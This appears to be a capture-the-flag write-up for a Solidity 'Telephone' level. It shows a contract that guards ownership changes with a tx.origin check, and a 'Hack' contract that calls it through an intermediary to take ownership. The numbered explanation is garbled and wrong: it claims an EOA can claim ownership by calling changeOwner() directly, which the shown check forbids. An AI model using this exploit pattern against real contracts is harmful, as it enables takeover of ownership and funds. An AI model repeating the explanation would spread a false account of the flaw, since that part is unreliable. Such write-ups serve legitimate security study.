# Claim ownership of the contract below to complete this level.

pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

# Solution
1. Get a new Instance of the contract
2. The idea is that any EOA calling the changeOwner() which is not the orignal owner(It's the externally owned account (EOA) that initiated the transaction) can change the ownership
3. In order to change the ownership, one can call the changeOwner() from their EOA and claim ownership

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Hack {
  Telephone private immutable target;
  constructor (address _target){
    target = Telephone(_target);
  }

  function hackOwner(address _target) public  {
    target.changeOwner(_target);
  }

}
```
